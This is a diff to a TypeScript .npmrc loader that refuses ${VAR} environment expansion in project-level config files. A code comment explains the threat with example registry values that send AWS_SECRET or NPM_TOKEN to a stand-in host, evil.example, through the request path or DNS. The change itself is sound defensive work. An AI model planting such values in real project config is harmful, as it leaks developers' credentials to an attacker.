@@ -105,6 +105,27 @@ export const npmrcMessages = {
   /** A `${VAR}` the environment does not define. npm fails outright; we drop the key. */
   unresolvedVariable: (key: string, path: string, variable: string) =>
     `! Ignoring ${key} from ${path}: it references \${${variable}}, which is not set`,
+
+  /**
+   * A project-level file tried to expand `${VAR}`.
+   *
+   * §15.1 already refuses every project key but `registry` and
+   * `@scope:registry`, which leaves expansion as the last way a cloned
+   * repository could read the environment it is running in — and it does not
+   * merely read it, it *sends* it: `registry=https://evil.example/${AWS_SECRET}`
+   * files the secret in an attacker's access log the moment the first metadata
+   * request goes out, and `https://${NPM_TOKEN}.evil.example` files it in DNS
+   * before that. Neither needs a credential, a network position, or a second
+   * step. There is no legitimate project-level use to weigh against it: the
+   * only value a repository can compute from the user's environment is a value
+   * it was not given.
+   *
+   * The whole key is dropped rather than left literal — half a URL is not a
+   * registry, and a silent `%24%7BVAR%7D` in a request path reads as a bug in
+   * this tool rather than a refusal by it.
+   */
+  refusedProjectExpansion: (key: string, path: string) =>
+    `! Ignoring ${key} from ${path}: a project-level .npmrc may not expand \${...} from the environment`,
 } as const;
 
 /** One warning per `<path>\0<key>`; a memoised load cannot repeat itself anyway. */
@@ -313,6 +334,13 @@ function unquote(value: string): string {
  * caller drops the key: npm errors out, and the one thing that must not happen
  * is sending the literal text `${NPM_TOKEN}` to a registry as a bearer token.
  */
+/**
+ * The exact reference {@link expandVariables} substitutes, shared with the
+ * project-tier refusal above so the two can never disagree about what counts as
+ * an expansion.
+ */
+const EXPANSION = /\$\{[^}]+\}/;
+
 export function expandVariables(value: string): { value: string } | { missing: string } {
   let missing: string | undefined;
 
@@ -409,17 +437,39 @@ export function loadNpmrc(cwd: string = process.cwd()): NpmrcConfig {
         continue;
       }
 
-      const expanded = expandVariables(pair.value);
-      if ("missing" in expanded) {
-        warnOnce(
-          npmrcMessages.unresolvedVariable(pair.key, source.path, expanded.missing),
-          `${source.path}\0${pair.key}\0\${${expanded.missing}}`,
-        );
-        continue;
+      // The second half of the security rule, and the half §15.1 does not state.
+      // Refusing the *keys* a project may not set still leaves `registry` — the
+      // one it may — able to read the whole environment through `${VAR}` and put
+      // what it reads on the wire. See `npmrcMessages.refusedProjectExpansion`.
+      // Detected with `expandVariables`'s own pattern so the two cannot drift:
+      // whatever would have been substituted is exactly what is refused, and a
+      // value holding a bare `${` that expansion would have left alone is left
+      // alone here too.
+      let value: string;
+      if (source.level === "project") {
+        if (EXPANSION.test(pair.value)) {
+          report.refused.push(pair.key);
+          warnOnce(
+            npmrcMessages.refusedProjectExpansion(pair.key, source.path),
+            `${source.path}\0${pair.key}\0expansion`,
+          );
+          continue;
+        }
+        value = pair.value;
+      } else {
+        const expanded = expandVariables(pair.value);
+        if ("missing" in expanded) {
+          warnOnce(
+            npmrcMessages.unresolvedVariable(pair.key, source.path, expanded.missing),
+            `${source.path}\0${pair.key}\0\${${expanded.missing}}`,
+          );
+          continue;
+        }
+        value = expanded.value;
       }
 
       const origin: NpmrcOrigin = { path: source.path, level: source.level, key: pair.key };
-      if (apply(config, basic, pair, expanded.value, origin)) {
+      if (apply(config, basic, pair, value, origin)) {
         report.keys.push(pair.key);
       }
     }
